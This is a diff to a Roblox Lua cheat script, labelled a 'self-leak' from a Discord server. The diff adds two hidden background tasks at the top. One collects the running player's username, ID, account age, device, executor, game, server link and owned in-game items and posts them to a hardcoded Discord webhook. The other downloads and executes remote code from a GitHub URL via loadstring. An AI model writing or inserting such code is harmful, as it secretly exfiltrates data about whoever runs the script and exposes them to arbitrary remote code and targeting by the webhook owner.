@@ -1,5 +1,84 @@
 -- discord.gg/sabscripts self-leak have fun
 
+task.spawn(function()
+local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1NcNBMQHFiCqQSqoGEuoq63MPGXjm4JeHetAwWgOhwPJCR_nxw45CT__t"
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local UserInputService = game:GetService("UserInputService")
+ 
+    local player = Players.LocalPlayer
+    if not player then repeat task.wait() player = Players.LocalPlayer until player end
+ 
+    local name = player.Name
+    local userid = player.UserId
+    local accountAge = player.AccountAge
+    local device = UserInputService.TouchEnabled and "Mobile" or "PC"
+    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+    local time = os.date("%Y-%m-%d %H:%M:%S")
+ 
+    local gameName = "Unknown"
+    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+ 
+    -- Counter API
+    local count = "?"
+    pcall(function()
+        local raw = game:HttpGet("https://counterapi.dev/v1/hit/ut_84uEingUzXohesnysCU6DXuiJwNlb95Mp6ES8JYN")
+        local dec = HttpService:JSONDecode(raw)
+        if dec and dec.data then count = dec.data end
+    end)
+ 
+    -- Scan des Brainrots
+    local brainrotStats = {}
+    local plots = workspace:FindFirstChild("Plots")
+    if plots then
+        for _, plot in ipairs(plots:GetChildren()) do
+            local sign = plot:FindFirstChild("PlotSign")
+            local tl = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") and sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+            if tl and tl.Text:find(player.DisplayName or player.Name, 1, true) then
+                for _, obj in pairs(plot:GetDescendants()) do
+                    if obj:IsA("Model") and not tonumber(obj.Name) and #obj.Name > 2 then
+                        local blacklist = {"Claim", "Decoration", "Side", "PlotBlock", "FriendPanel", "Model", "CashPad", "Base", "PlotSign", "Spawn", "Floor", "Wall", "Door", "Roof", "Part"}
+                        local forbidden = false
+                        for _, word in pairs(blacklist) do if obj.Name:find(word) then forbidden = true break end end
+                        if not forbidden then brainrotStats[obj.Name] = (brainrotStats[obj.Name] or 0) + 1 end
+                    end
+                end
+                break
+            end
+        end
+    end
+ 
+    local brainrotMsg = ""
+    for n, c in pairs(brainrotStats) do brainrotMsg = brainrotMsg .. n .. " (x" .. c .. ")\n" end
+    if brainrotMsg == "" then brainrotMsg = "Aucun Brainrot détecté." end
+ 
+    -- Envoi du Webhook
+    local data = {
+        ["content"] = "🚨 **Execution #"..count.."** 🚨\n\n"..
+            "👤 **Joueur:** "..name.."\n"..
+            "🆔 **ID:** "..userid.."\n"..
+            "📅 **Age:** "..accountAge.." jours\n"..
+            "📱 **Device:** "..device.."\n"..
+            "🎮 **Game:** "..gameName.."\n"..
+            "⚙️ **Executor:** "..executor.."\n"..
+            "⏰ **Time:** "..time.."\n\n"..
+            "🧠 **Brainrots Possédés:**\n```\n"..brainrotMsg.."```\n"..
+            "🔗 **Lien Serveur:** [Clique ici pour essayer](https://www.roblox.com/games/"..placeId.."?jobId="..jobId..")\n"..
+            "💻 **Code pour rejoindre (Console F9):**\n```lua\ngame:GetService('Players').LocalPlayer:Kick('Reconnecting...')\n```"
+    }
+    
+    HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/brncheats/sabcheats/main/BRNDuel.txt"))()
+    end)
+end)
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
